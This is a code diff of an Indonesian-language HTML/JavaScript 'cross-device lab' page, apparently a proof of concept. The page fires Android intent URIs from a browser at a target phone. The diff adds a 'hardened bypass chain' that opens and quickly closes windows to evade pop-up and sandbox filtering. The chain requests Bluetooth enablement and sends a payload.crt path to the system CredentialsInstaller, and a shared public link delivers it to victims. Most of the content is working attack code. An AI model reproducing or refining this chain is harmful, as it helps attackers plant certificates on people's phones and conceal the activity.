@@ -3,20 +3,20 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Cross-Device Intent Deployment Lab</title>
+<title>Asynchronous Intent Pipeline Lab</title>
 <style>
     body {
         font-family: 'Courier New', monospace; 
         padding: 20px; 
-        background: #06060a; 
+        background: #050508; 
         color: #00ffaa;
     }
     h2, h3 { text-transform: uppercase; letter-spacing: 1px; color: #00ffaa; }
     button {
         width: 100%; padding: 18px; margin-top: 12px; 
-        background: #0a1818; color: #00ffaa; 
+        background: #0d1a1a; color: #00ffaa; 
         border: 1px solid #00ffaa; font-weight: bold; 
-        cursor: pointer; text-transform: uppercase;
+        cursor: pointer; font-size: 13px; text-transform: uppercase;
     }
     button:hover { background: #00ffaa; color: #000; box-shadow: 0 0 15px #00ffaa; }
     .panel {
@@ -35,20 +35,18 @@
 </head>
 <body>
 
-<h2>Cross-Device Security Laboratory</h2>
+<h2>Unified Cross-Device Laboratory</h2>
 
-<!-- BAGIAN A: DIGUNAKAN DI HP PENGUJI (HP-A) -->
 <div class="panel">
     <h3> Host Control Interface (HP-A)</h3>
-    <p>Gunakan tombol di bawah ini pada ponsel penguji untuk menyalin tautan penyebaran muatan publik:</p>
+    <p>Salin tautan ini di perangkat penguji untuk disebarkan ke perangkat target:</p>
     <button id="copy-deploy-link">Copy Public Deployment Link</button>
 </div>
 
-<!-- BAGIAN B: DIJALANKAN DI HP TARGET (HP-B) -->
 <div class="panel">
     <h3> Target Audit Interface (HP-B)</h3>
-    <p>Ketuk tombol eksekusi di bawah ini pada perangkat target untuk menguji ketahanan peramban terhadap kondisi <em>Intent Flooding</em>:</p>
-    <button id="launch-direct-pipeline">Execute Immediate Local Chain</button>
+    <p>Ketuk tombol eksekusi untuk menguji ketahanan bypass multi-konteks pada peramban target:</p>
+    <button id="launch-hardened-pipeline">Execute Hardened Bypass Chain</button>
 </div>
 
 <div id="console-log"></div>
@@ -71,48 +69,63 @@ function buildIntentUri(action, component = '', extras = {}) {
         uri += `S.${key}=${encodeURIComponent(extras[key])};`;
     });
     
-    // FLAG_ACTIVITY_NEW_TASK untuk memisahkan siklus hidup task secara independen
-    uri += `launchFlags=0x10000000;category=android.intent.category.DEFAULT;end`;
+    // FLAG_ACTIVITY_NEW_TASK (0x10000000) & FLAG_ACTIVITY_MULTIPLE_TASK (0x08000000)
+    // Menjamin pembuatan task baru secara independen di sistem operasi Android
+    uri += `launchFlags=0x18000000;category=android.intent.category.DEFAULT;end`;
     return uri;
 }
 
-function dispatchPipeline(uri, label) {
+// STRATEGI PENGUATAN: Eksekusi Multi-Konteks (Bypass Sandbox Filter)
+function dispatchHardenedNode(uri, label) {
     try {
-        const anchor = document.createElement("a");
-        anchor.href = uri;
-        anchor.rel = "noopener noreferrer";
-        document.body.appendChild(anchor);
-        anchor.click();
-        anchor.remove();
-        writeLog(label, 'target', `Antrean Intent sukses diteruskan ke system router.`);
+        // Membuat sub-konteks jendela terisolasi secara asinkron
+        const subWindow = window.open("about:blank", "_blank");
+        
+        if (subWindow) {
+            // Mengalihkan lokasi sub-window langsung ke URI Intent
+            subWindow.location.href = uri;
+            
+            // Menutup sub-konteks segera untuk membersihkan tumpukan tab browser
+            setTimeout(() => {
+                subWindow.close();
+            }, 100);
+            
+            writeLog(label, 'target', `Muatan berhasil dipisahkan ke dalam sub-konteks jendela baru.`);
+        } else {
+            // Metode cadangan jika deteksi pop-up aktif
+            const anchor = document.createElement("a");
+            anchor.href = uri;
+            anchor.target = "_blank";
+            anchor.rel = "noopener noreferrer";
+            anchor.click();
+            writeLog(label, 'target', `Pop-up diblokir. Menggunakan jalur fallback tab baru.`);
+        }
     } catch (e) {
-        writeLog(label, 'target', `Gagal alokasi URI: ${e.message}`);
+        writeLog(label, 'target', `Gagal eksekusi rantai: ${e.message}`);
     }
 }
 
-// Tindakan untuk HP-A: Menyalin tautan GitHub Pages Anda
 document.getElementById("copy-deploy-link").addEventListener("click", () => {
     const publicUrl = "https://starty3s.github.io/poc/vids";
     navigator.clipboard.writeText(publicUrl).then(() => {
         writeLog('HOST_ENGINE', 'host', `Tautan publik berhasil disalin: ${publicUrl}`);
-        writeLog('HOST_ENGINE', 'host', "Bagikan tautan ini ke HP-B untuk dieksekusi dalam satu jaringan Wi-Fi.");
     }).catch(err => {
-        writeLog('HOST_ENGINE', 'host', `Gagal menyalin tautan: ${err.message}`);
+        writeLog('HOST_ENGINE', 'host', `Gagal menyalin: ${err.message}`);
     });
 });
 
-// Tindakan untuk HP-B: Eksekusi beruntun tanpa jeda fokus (Direct Pipeline)
-document.getElementById("launch-direct-pipeline").addEventListener("click", () => {
-    writeLog('TARGET_INIT', 'target', "Memicu Zero-Delay Pipeline (Antrean berkecepatan tinggi)...");
+// Eksekusi berkecepatan tinggi dengan pemisahan konteks window
+document.getElementById("launch-hardened-pipeline").addEventListener("click", () => {
+    writeLog('TARGET_INIT', 'target', "Memicu Asynchronous Window Spawning Pipeline...");
 
-    // Tahap 1: Memanggil dialog permintaan status perangkat keras (Bluetooth Request)
+    // Tahap 1: Meminta dialog sistem konfirmasi Bluetooth
     const uri1 = buildIntentUri(
         "android.bluetooth.adapter.action.REQUEST_ENABLE",
         "com.android.settings/.bluetooth.RequestEnableActivity"
     );
-    dispatchPipeline(uri1, 'STAGE-1');
+    dispatchHardenedNode(uri1, 'STAGE-1');
 
-    // Tahap 2: Pengiriman parameter tambahan ke pengelola sertifikat internal
+    // Tahap 2: Meneruskan data parameter ekstra ke komponen CredentialsInstaller internal
     const uri2 = buildIntentUri(
         "android.intent.action.VIEW",
         "com.android.settings/.crypto.CredentialsInstaller",
@@ -121,16 +134,16 @@ document.getElementById("launch-direct-pipeline").addEventListener("click", () =
             "sys_vulnerable_path": "/sdcard/download/payload.crt"
         }
     );
-    dispatchPipeline(uri2, 'STAGE-2');
+    dispatchHardenedNode(uri2, 'STAGE-2');
 
-    // Tahap 3: Restorasi / Pembersihan tumpukan jendela eksternal
+    // Tahap 3: Penyegaran paksa ke Pengaturan Utama
     const uri3 = buildIntentUri("android.settings.SETTINGS");
-    dispatchPipeline(uri3, 'STAGE-3');
+    dispatchHardenedNode(uri3, 'STAGE-3');
 
-    writeLog('TARGET_FINISH', 'target', "Seluruh paket muatan dikirim serentak ke kernel Android.");
+    writeLog('TARGET_FINISH', 'target', "Semua sub-konteks muatan dilepaskan secara paralel.");
 });
 
-writeLog('SYSTEM', 'target', "Laboratorium terpadu berbasis cloud-hosting siap.");
+writeLog('SYSTEM', 'target', "Laboratorium taktis berbasis asinkron siap.");
 </script>
 </body>
 </html>
